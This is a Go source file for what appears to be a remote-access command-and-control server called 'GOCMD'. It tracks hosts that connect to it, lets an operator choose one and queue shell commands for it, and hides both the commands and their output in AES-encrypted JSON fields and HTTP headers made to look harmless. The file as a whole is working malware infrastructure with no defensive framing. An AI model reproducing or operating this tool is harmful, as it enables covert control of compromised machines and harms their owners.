package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"math/big"
	"net/http"
	"os"
	"strings"
	"time"
)

var host = make(map[string]string)

var chost = "0.0.0.0"

var cmd = ""

func C1reateRandomString(len int) string  {
	var container string
	var str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
	b := bytes.NewBufferString(str)
	length := b.Len()
	bigInt := big.NewInt(int64(length))
	for i := 0;i < len ;i++  {
		randomInt,_ := rand.Int(rand.Reader,bigInt)
		container += string(str[randomInt.Int64()])
	}
	return container
}


func A1esCtrEncrypt(plainText, key []byte) string {
	block, _:= aes.NewCipher(key)
	iv := bytes.Repeat([]byte("1"), block.BlockSize())
	stream := cipher.NewCTR(block, iv)
	dst := make([]byte, len(plainText))
	stream.XORKeyStream(dst, plainText)
	return base64.URLEncoding.EncodeToString(dst)
}


func A1esCtrDecrypt(plainText, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	iv := bytes.Repeat([]byte("1"), block.BlockSize())
	stream := cipher.NewCTR(block, iv)

	dst := make([]byte, len(plainText))
	stream.XORKeyStream(dst, plainText)

	return dst, nil
}


func handlePostJson(writer http.ResponseWriter, request *http.Request) {
	decoder := json.NewDecoder(request.Body)
	var params map[string]string
	decoder.Decode(&params)
	host[request.RemoteAddr] = request.RemoteAddr
	var r = make(map[string]string)
	var m = "pong"
	if len(cmd) > 0 {
		m=cmd
	}

	action_,_ :=base64.URLEncoding.DecodeString(request.Header.Get("WWW"))
	action,_ := A1esCtrDecrypt(action_,[]byte(request.Header.Get("Authorization")))
	if string(action) =="resp" &&  chost== strings.Split(request.RemoteAddr, ":")[0] {
		data_,_ :=base64.URLEncoding.DecodeString(params["data"])
		resp,_ := A1esCtrDecrypt(data_,[]byte(request.Header.Get("X-Requested-With")))
		fmt.Println(string(resp))
		cmd = ""
	}

	cja := C1reateRandomString(16)
	r["username"]= cja
	r["info"] = A1esCtrEncrypt([]byte(m),[]byte(cja))
	jsonStr, _ := json.Marshal(r)
	fmt.Fprintf(writer,string(jsonStr))


}



func main() {
	go func() {

		http.HandleFunc("/", handlePostJson)

		if err := http.ListenAndServe(":8082", nil); err != nil {
			log.Fatal(err)
		}
	}()

	var multilineStr =
		`
                <------------GOCMD--------->
		<---------WELCOME TO USE THIS PROGRAM--------->
		<---------v1.0 - Author - ACE86 --------->
		<---------CMD：   list          --  list all host        --------->
		<---------CMD：   select  $ip   --  connect  to the host --------->
		<---------CMD：   exit          --  exit                 --------->
`

	fmt.Println(multilineStr)
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("# ")
		cmdString, err := reader.ReadString('\n')
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
		}
		err = runCommand(cmdString)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
		}
	}

	}

func runCommand(commandStr string) error {
	commandStr = strings.TrimSuffix(commandStr, "\n")
	arrCommandStr := strings.Fields(commandStr)
	switch arrCommandStr[0] {
	case "list":
		for k := range host {
			fmt.Println(strings.Split(k, ":")[0])
		}
		return nil

	case "select":

		reader := bufio.NewReader(os.Stdin)
		for {
			fmt.Print(arrCommandStr[1] + " $ ")
			cmdString, err := reader.ReadString('\n')
			chost = arrCommandStr[1]
			cmd = cmdString
			time.Sleep(2*time.Second)

			if err != nil {
				fmt.Fprintln(os.Stderr, err)
			}
			err = runCommand(cmdString)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
			}
		}

		return nil

	case "exit":
		os.Exit(0)

	}
return nil

}
